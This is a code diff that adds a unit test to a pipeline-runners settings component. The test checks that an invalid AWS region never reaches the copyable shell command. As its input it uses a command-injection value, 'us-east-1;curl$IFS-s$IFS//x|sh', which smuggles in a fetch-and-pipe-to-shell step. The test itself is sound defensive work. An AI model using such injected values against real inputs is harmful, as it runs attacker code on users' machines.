@@ -217,6 +217,22 @@ describe('PipelineRunnersSettings — what it shows', () => {
     expect(setupRunnerCommand({ region: '' })).toBe('pipeline-manager infra setup-runner --region <region>');
   });
 
+  it('install instructions never put an invalid region into the copyable command', async () => {
+    // The field is free text and the command is pasted into a shell: a value
+    // that is not a region code shows the placeholder, not the raw input.
+    api.getPipelineRunners.mockResolvedValue(ok(dto({ own: [] })));
+    render(<PipelineRunnersSettings orgId="org-1" />);
+    const install = await screen.findByTestId('runner-install');
+    fireEvent.change(within(install).getByLabelText('AWS region'), { target: { value: 'us-east-1;curl$IFS-s$IFS//x|sh' } });
+    expect(install).toHaveTextContent('is not an AWS region code');
+    const commands = within(install).getAllByText(/pipeline-manager infra setup-runner/);
+    expect(commands.length).toBeGreaterThan(0);
+    for (const c of commands) {
+      expect(c.textContent).not.toContain('curl');
+      expect(c.textContent).toContain('--region <region>');
+    }
+  });
+
   it('install instructions are collapsed behind "Install a runner" once there is a runner', async () => {
     render(<PipelineRunnersSettings orgId="org-1" />);
     await screen.findByTestId('runner-r1');
